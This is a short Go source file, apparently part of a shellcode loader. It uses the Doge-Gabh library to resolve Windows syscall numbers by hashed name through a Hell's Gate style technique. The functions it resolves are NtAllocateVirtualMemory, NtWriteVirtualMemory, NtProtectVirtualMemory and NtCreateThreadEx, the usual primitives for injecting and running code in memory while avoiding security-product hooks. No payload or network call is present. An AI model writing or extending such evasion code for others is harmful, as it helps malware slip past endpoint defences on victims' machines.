package main

// 直接系统调用

import (
	"crypto/sha256"
	"encoding/hex"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
)

func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}

var (
	NtAllocateVirtualMemorySysid, _ = gabh.DiskHgate(Sha256Hex("NtAllocateVirtualMemory"), Sha256Hex)
	NtWriteVirtualMemorySysid, _    = gabh.DiskHgate(Sha256Hex("NtWriteVirtualMemory"), Sha256Hex)
	NtProtectVirtualMemorySysid, _  = gabh.DiskHgate(Sha256Hex("NtProtectVirtualMemory"), Sha256Hex)
	NtCreateThreadExSysid, _        = gabh.DiskHgate(Sha256Hex("NtCreateThreadEx"), Sha256Hex)
)
